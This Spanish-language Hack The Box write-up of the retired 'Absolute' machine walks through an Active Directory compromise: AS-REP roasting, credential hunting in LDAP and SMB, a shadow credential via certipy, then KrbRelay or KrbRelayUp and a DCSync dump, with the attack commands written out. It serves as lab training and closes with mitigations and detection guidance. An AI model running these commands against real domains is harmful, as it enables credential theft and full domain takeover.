---
machine: Absolute
os: Windows
difficulty: Insane
platform: Hack The Box
category: Windows / Active Directory / ADCS
state: Retired
tags: [windows, active-directory, as-rep, ldap, smb, shadow-credentials, krbrelay, dcsync]
---

# Absolute — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired según HTB y writeups públicos; no comprobado con sesión en HTB.
> Ficha de método: sin flags ni credenciales reales.

## TL;DR

DC `dc.absolute.htb` del dominio `absolute.htb`. La web filtra nombres en metadatos, `kerbrute` confirma usuarios y `d.klay` no requiere preautenticación: AS-REP roasting y crackeo. Con esa cuenta se enumeran credenciales de `svc_smb` en LDAP; el share `Shared` entrega un binario que revela la contraseña de `m.lovegod`. Ese usuario tiene `GenericWrite` sobre `winrm_user`, así que se añade una **shadow credential** y se entra por WinRM. ADCS está presente pero **ESC1 está mitigado**; la elevación final usa **KrbRelay** para añadir `winrm_user` a Administrators, o la variante KrbRelayUp contra `DC$` para DCSync.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -T4 -Pn -oA nmap_all <IP>
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV -Pn -oA nmap_svc <IP>
```

```text
53/tcp    domain        Simple DNS Plus
80/tcp    http          Microsoft IIS 10.0
88/tcp    kerberos-sec  Microsoft Windows Kerberos
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap          AD LDAP (Domain: absolute.htb)
445/tcp   microsoft-ds
464/tcp   kpasswd5
593/tcp   ncacn_http
636/tcp   ssl/ldap
3268/tcp  ldap          Global Catalog
3269/tcp  ssl/ldap
5985/tcp  wsman
9389/tcp  adws
```

- DC `DC.ABSOLUTE.HTB`, dominio `absolute.htb`.
- IIS aloja una web corporativa con imágenes y metadatos; es el primer hilo.
- LDAP permite binds autenticados y el share `Shared` es la siguiente parada.
- Hay ADCS, pero eso no implica una plantilla ESC1: hay que enumerar antes de asumirlo.

```bash
printf '%s\n' '<IP> absolute.htb dc.absolute.htb DC' | sudo tee -a /etc/hosts
```

## Enumeración

### Web y usuarios

```bash
whatweb http://absolute.htb
exiftool image.jpg
curl -s http://absolute.htb/ | grep -Eo '[a-zA-Z]+\.?[a-zA-Z]*' | sort -u
```

Los metadatos y el contenido de la web dan nombres plausibles. Se construye una lista y se valida contra Kerberos:

```bash
kerbrute userenum -d absolute.htb --dc <IP> users.txt
```

`d.klay` aparece como usuario válido y **sin preautenticación**. Es un AS-REP roast directo:

```bash
GetNPUsers.py absolute.htb/ -dc-ip <IP> -no-pass -usersfile users.txt
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

Resultado: `d.klay:<PASS_DKLAY>`.

### LDAP y el share

Con `d.klay` se enumera LDAP. En la descripción de un objeto de servicio aparece la credencial de `svc_smb` (`<PASS_SVC_SMB>`), que permite leer el share `Shared`:

```bash
smbclient //absolute.htb/Shared -U 'absolute.htb/svc_smb%<PASS_SVC_SMB>'
```

Dentro hay un binario de Windows. Se analiza con `strings` (incluido UTF-16) y se recupera otra credencial:

```bash
strings -el shared.exe | grep -iE 'pass|user|ldap'
```

La cadena corresponde a `m.lovegod` (`<PASS_MLOVEGOD>`).

### GenericWrite y shadow credential

`m.lovegod` tiene `GenericWrite` sobre `winrm_user`. En lugar de cambiar la contraseña, se escribe `msDS-KeyCredentialLink` (shadow credential) y se obtiene un ticket PKINIT:

```bash
KRB5CCNAME=./m.lovegod.ccache certipy shadow auto \
  -username m.lovegod@absolute.htb -account winrm_user \
  -k -target dc.absolute.htb
```

`certipy` devuelve un `.pfx` y un `.ccache` para `winrm_user`:

```bash
KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb
```

La flag de usuario está en el perfil de `winrm_user`.

## Escalada de privilegios

### Lo que no funciona: ESC1

`certipy-ad find -vulnerable` puede listar la CA y plantillas, pero en este build **no hay una ESC1 explotable**: la inscripción está restringida. Los writeups que llegan a root no usan una plantilla ESC1; usan la shadow credential y un relay. Es importante no confundir "hay ADCS" con "hay ESC1".

### KrbRelay: winrm_user → Administrators

`winrm_user` tiene sesión, pero no es administrador. Se usa **KrbRelay** para retransmitir la autenticación de la máquina a LDAP y añadir `winrm_user` al grupo local `Administrators`:

```powershell
.\RunasCs.exe m.lovegod '<PASS_MLOVEGOD>' -d absolute.htb -l 9 ^
  ".\KrbRelay.exe -spn ldap/dc.absolute.htb ^
   -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 ^
   -add-groupmember administrators winrm_user"
```

El CLSID y la sintaxis dependen de la versión de KrbRelay; el writeup de 0xdf usa el valor anterior. Si el relay funciona, `winrm_user` queda en `Administrators` y se puede leer la flag de root por WinRM.

### Variante: DC$ y DCSync

La otra ruta documentada usa **KrbRelayUp** con una shadow credential sobre la cuenta de máquina `DC$`. Al obtener el ticket de `DC$`, se puede hacer DCSync:

```bash
crackmapexec smb -dc-ip dc.absolute.htb -u 'DC$' -H <DC_NT_HASH> --ntds
```

El hash de `DC$` (`<DC_NT_HASH>`) no se publica. Con el volcado de NTDS se obtiene el hash de Administrator y se usa pass-the-hash o `wmiexec`.

No se deben mezclar las dos variantes: o se añade `winrm_user` a Administrators, o se compromete `DC$` y se hace DCSync. Las dos aparecen en fuentes independientes.

## Evidencia

- `nmap` con DC, LDAP, SMB y WinRM.
- Metadatos de la web y `kerbrute` con `d.klay`.
- AS-REP y crackeo, contraseña redactada.
- LDAP con la credencial de `svc_smb` y `strings -el` del binario.
- `certipy shadow auto` y `evil-winrm` con el ccache de `winrm_user`.
- `KrbRelay` añadiendo `winrm_user` a Administrators, o `DC$` + `--ntds`.
- `whoami`/`nt authority\system`, sin flags ni hashes.

## Lecciones aprendidas

- Los metadatos de una web no son un adorno: filtran nombres y contexto para el AS-REP.
- Un usuario sin preautenticación es un hash offline; `kerbrute` + `GetNPUsers` lo convierten en acceso.
- `GenericWrite` sobre un usuario no obliga a resetear la contraseña: una shadow credential es más sigilosa y deja PKINIT.
- ADCS puede estar presente y sano; la escalada puede venir de un relay, no de una plantilla.
- KrbRelay necesita un CLSID y un canal válidos; la variante `DC$` cambia el objetivo y lleva a DCSync.

## Mitigaciones y detección

- Exigir preautenticación Kerberos a todas las cuentas; revisar `DONT_REQ_PREAUTH`.
- Restringir `GenericWrite`/`GenericAll` sobre usuarios y equipos; auditar `msDS-KeyCredentialLink` (5136) y las shadow credentials.
- Deshabilitar NTLM relay cuando sea posible, exigir LDAP signing y channel binding; revisar el CLSID y los relays Kerberos.
- Proteger `DC$` y las cuentas de máquina; monitorizar 4662 con derechos de replicación y 4624 tipo 3.
- Detección: 4768/4769 anómalos, 5136 sobre `msDS-KeyCredentialLink`, 4728/4732, 4662, 7045.
- MITRE: T1558.004, T1098.001, T1550.002, T1003.006, T1021.006.

## Referencias

- <https://0xdf.gitlab.io/2023/05/27/htb-absolute.html>
- <https://rootjaxk.github.io/posts/absolute>
- <https://www.hackthebox.com/machines/absolute>
- <https://github.com/ly4k/Certipy>
